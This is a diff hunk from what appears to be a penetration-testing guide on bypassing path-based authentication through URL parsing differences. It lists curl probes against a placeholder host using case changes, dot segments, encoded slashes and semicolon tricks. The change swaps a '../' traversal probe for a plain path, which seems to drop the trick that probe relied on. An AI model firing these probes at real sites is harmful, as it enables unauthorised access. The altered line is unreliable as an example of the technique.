@@ -153,7 +153,7 @@ Exploit URL parsing differences to bypass path-based authentication rules.
 curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/dashboard"
 curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/ADMIN/dashboard"
 curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin/./dashboard"
-curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/public/../admin/dashboard"
+curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/public/admin/dashboard"
 curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin%2fdashboard"
 curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/;/admin/dashboard"
 curl -s -o /dev/null -w "%{http_code}" "https://target.example.com/admin;anything/dashboard"
